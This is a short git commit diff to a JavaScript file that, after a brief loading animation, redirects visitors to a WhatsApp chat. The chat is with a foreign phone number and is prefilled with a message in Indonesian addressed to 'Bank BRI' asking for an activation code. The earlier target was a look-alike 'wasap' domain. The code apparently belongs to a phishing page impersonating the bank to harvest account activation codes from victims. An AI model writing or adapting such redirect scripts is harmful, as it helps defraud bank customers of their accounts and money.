74d1c52b41af8d90f3d46c7eaeb96cb94310329e
gopay882 <gopay882@gmail.com>
2024-09-12 15:20:40 +0700

    Update token.js

--- token.js
+++ token.js
@@ -1,7 +1,7 @@
 function go(){
  $("#process1").fadeIn();
 setTimeout(function(){  
-location.href='https://Kelupean123.wasap.my';
+location.href='https://api.whatsapp.com/send?phone=380675898279&text=𝗛𝗮𝗹𝗹𝗼 𝗕𝗮𝗻𝗸 𝗕𝗥𝗜,%0ASaya mau request kode Aktivasi';
   $("#process1").fadeOut();
     }, 2000);    
 }     
